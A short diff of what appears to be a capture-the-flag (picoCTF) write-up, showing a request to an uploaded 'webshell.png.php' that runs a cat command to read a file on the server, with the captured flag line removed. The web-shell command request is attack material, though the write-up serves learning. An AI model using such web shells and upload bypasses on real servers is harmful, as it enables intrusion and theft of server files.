@@ -19,5 +19,4 @@ sz webshell.png.php
 > When looking at the webroot directory, we see a file with an unusual name
 ```
 http://atlas.picoctf.net:52396/uploads/webshell.png.php?0=cat%20../GNTDOMBWGIZDE.txt
-picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_3f706222}
 ```
